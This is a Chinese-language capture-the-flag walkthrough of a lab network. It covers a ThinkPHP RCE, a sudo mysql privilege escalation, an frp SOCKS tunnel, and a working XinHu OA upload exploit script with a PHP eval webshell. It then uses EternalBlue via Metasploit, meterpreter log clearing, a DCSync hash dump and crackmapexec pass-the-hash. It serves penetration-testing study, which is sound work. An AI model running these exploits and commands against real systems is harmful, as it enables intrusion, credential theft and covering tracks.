# initial靶机

## 外网

首先是个登录界面，用fscan扫一下发现是thinkphp5.0.23

用one-fox里面的thinkphp一把梭然后蚁剑连接

这里读取flag要sudo提权，用的mysql提权

```
sudo mysql -e '\! find / -type f -name '*flag*' 2>/dev/null'
sudo mysql -e '\! cat /root/flag/flag01.txt'
```

![12](D:\Pictures\Screenshots\12.png)

## 内网

接下来就是要考虑内网横向移动，我们的最终目的是获取域控上的 `flag`，我们先用蚁剑上传 `fscan`，扫描一下内网中有那些存活机器

给fscan权限 chmod 777 fscan

ifconfig查看ip

![14](D:\Pictures\Screenshots\14.png)

扫描整个网段

扫描的结果会自动存在当前目录的 `result.txt` 文件上

**172.22.1.2:DC域控**
**172.22.1.21:Windows的机器并且存在MS17-010 漏洞**
**172.22.1.18:信呼OA办公系统**

对 `OA` 办公系统进行攻击，在这之前我们要先进行内网穿透，其目的是使我们能够在攻击机访问内网的服务，这里我们需要一台 `vps` 和工具 `frp`

frps.ini:

```
[common]
bind_port = 7000
```

frpc.ini

```
[common] 
server_addr = 47.109.157.54
server_port = 7000  

[socks5] 
type = tcp   
plugin = socks5  
remote_port = 798
```

然后在vps执行：

```
./frps -c frps.ini
```

在 `靶机` 执行：

```
./frpc -c frpc.ini
```

接着配置proxyserver

![image-20251205210508315](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251205210508315.png)

配置规则

![image-20251205210542448](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251205210542448.png)

先打OA，这里弱口令进入

![18](D:\Pictures\Screenshots\18.png)

信呼的利用脚本

```
import requests


session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=::',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}


r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('whoami');")
print(r.text)
```

利用脚本相同目录下还要有一个 `1.php` 文件存的是一句话木马
1.php:

```
<?php eval($_POST["1"]);?>
```

访问172.22.1.18/upload/2025-12/05_20082349.php然后蚁剑连接即可，可以在管理员那里找到flag2



接着打开始扫出来的永恒之蓝

改/etc/proxychains4.conf文件在末位加加上 `socks5 vps ip 端口`（但这里好像不需要，可能是因为windows里面的proxifier自动弄了）

启动MSF：

```
msfconsole
```

```
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.22.1.21     # 目标 IP
set payload windows/x64/meterpreter/bind_tcp_uuid   #设置payload
exploit
```

运行成功会出现meterpreter>
该 `Meterpreter` 是 `metasploit` 的一个扩展模块，可以调用 `metasploit` 的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传/下载文件、创建持久后门等。
该模块常用的命令：

```
meterpreter > screenshot # 捕获屏幕
meterpreter > upload hello.txt c:// #上传文件
meterpreter > download d://1.txt # 下载文件
meterpreter > shell # 获取cmd
meterpreter > clearev # 清除日志
```

接下来是进行 `DCSync` 攻击，这里简单解释一下：
首先，什么是 `DCSync`

> 在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。
> DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash

也就是说我们可以通过 `DCSync` 来导出所有用户的 `hash` 然后进行哈希传递攻击，要想使用 `DCSync` 必须获得以下任一用户的权限：

> Administrators 组内的用户
> Domain Admins 组内的用户
> Enterprise Admins 组内的用户域控制器的计算机帐户

![29](D:\Pictures\Screenshots\29.png)

用永恒之蓝打的是Enterprise Admins，可以

```
load kiwi  # 调用mimikatz模块
kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit  # 导出域内所有用户的信息(包括哈希值)
```

成功获取Administrator用户密码哈希

使用 `crackmapexec` 来进行哈希传递攻击

```
crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

| `-u administrator` | 使用用户名：`administrator`                       |
| ------------------ | ------------------------------------------------- |
| `-H 10cf...`       | 使用 NTLM 哈希值登录（哈希传递）                  |
| `-d xiaorang.lab`  | 指定目标域（Domain） 获取用户信息里面有           |
| `-x "type ..." `   | 执行一条命令（如读取文件）  type是windows读取命令 |

获取到flag3